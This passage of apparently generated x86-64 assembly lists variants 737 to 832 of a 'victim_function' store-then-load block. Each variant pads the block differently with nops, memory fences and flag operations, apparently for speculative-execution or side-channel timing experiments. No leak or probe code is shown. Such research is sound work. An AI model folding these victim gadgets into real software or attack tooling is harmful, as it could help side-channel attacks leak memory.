	jmp	.Lvictim_function_win0_continue
## Variant 737
.Lvictim_function_win0_var737:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 738
.Lvictim_function_win0_var738:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 739
.Lvictim_function_win0_var739:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	nop
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 740
.Lvictim_function_win0_var740:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 741
.Lvictim_function_win0_var741:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 742
.Lvictim_function_win0_var742:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 743
.Lvictim_function_win0_var743:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 744
.Lvictim_function_win0_var744:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 745
.Lvictim_function_win0_var745:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 746
.Lvictim_function_win0_var746:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 747
.Lvictim_function_win0_var747:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 748
.Lvictim_function_win0_var748:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 749
.Lvictim_function_win0_var749:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 750
.Lvictim_function_win0_var750:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 751
.Lvictim_function_win0_var751:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 752
.Lvictim_function_win0_var752:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 753
.Lvictim_function_win0_var753:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 754
.Lvictim_function_win0_var754:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 755
.Lvictim_function_win0_var755:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 756
.Lvictim_function_win0_var756:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 757
.Lvictim_function_win0_var757:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 758
.Lvictim_function_win0_var758:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 759
.Lvictim_function_win0_var759:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 760
.Lvictim_function_win0_var760:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 761
.Lvictim_function_win0_var761:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 762
.Lvictim_function_win0_var762:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 763
.Lvictim_function_win0_var763:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 764
.Lvictim_function_win0_var764:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 765
.Lvictim_function_win0_var765:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 766
.Lvictim_function_win0_var766:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 767
.Lvictim_function_win0_var767:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 768
.Lvictim_function_win0_var768:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 769
.Lvictim_function_win0_var769:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 770
.Lvictim_function_win0_var770:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	nop
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 771
.Lvictim_function_win0_var771:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 772
.Lvictim_function_win0_var772:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 773
.Lvictim_function_win0_var773:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 774
.Lvictim_function_win0_var774:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 775
.Lvictim_function_win0_var775:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 776
.Lvictim_function_win0_var776:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 777
.Lvictim_function_win0_var777:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 778
.Lvictim_function_win0_var778:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 779
.Lvictim_function_win0_var779:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 780
.Lvictim_function_win0_var780:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 781
.Lvictim_function_win0_var781:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 782
.Lvictim_function_win0_var782:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 783
.Lvictim_function_win0_var783:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 784
.Lvictim_function_win0_var784:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 785
.Lvictim_function_win0_var785:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 786
.Lvictim_function_win0_var786:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 787
.Lvictim_function_win0_var787:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 788
.Lvictim_function_win0_var788:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 789
.Lvictim_function_win0_var789:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 790
.Lvictim_function_win0_var790:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 791
.Lvictim_function_win0_var791:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 792
.Lvictim_function_win0_var792:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 793
.Lvictim_function_win0_var793:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 794
.Lvictim_function_win0_var794:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 795
.Lvictim_function_win0_var795:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	nop
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 796
.Lvictim_function_win0_var796:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 797
.Lvictim_function_win0_var797:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 798
.Lvictim_function_win0_var798:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 799
.Lvictim_function_win0_var799:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 800
.Lvictim_function_win0_var800:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 801
.Lvictim_function_win0_var801:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 802
.Lvictim_function_win0_var802:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 803
.Lvictim_function_win0_var803:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 804
.Lvictim_function_win0_var804:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 805
.Lvictim_function_win0_var805:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 806
.Lvictim_function_win0_var806:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 807
.Lvictim_function_win0_var807:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 808
.Lvictim_function_win0_var808:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 809
.Lvictim_function_win0_var809:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 810
.Lvictim_function_win0_var810:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 811
.Lvictim_function_win0_var811:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 812
.Lvictim_function_win0_var812:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 813
.Lvictim_function_win0_var813:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 814
.Lvictim_function_win0_var814:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 815
.Lvictim_function_win0_var815:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 816
.Lvictim_function_win0_var816:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 817
.Lvictim_function_win0_var817:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 818
.Lvictim_function_win0_var818:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 819
.Lvictim_function_win0_var819:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 820
.Lvictim_function_win0_var820:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 821
.Lvictim_function_win0_var821:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 822
.Lvictim_function_win0_var822:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 823
.Lvictim_function_win0_var823:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 824
.Lvictim_function_win0_var824:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 825
.Lvictim_function_win0_var825:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 826
.Lvictim_function_win0_var826:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 827
.Lvictim_function_win0_var827:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 828
.Lvictim_function_win0_var828:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 829
.Lvictim_function_win0_var829:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 830
.Lvictim_function_win0_var830:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 831
.Lvictim_function_win0_var831:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 832
.Lvictim_function_win0_var832:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 833
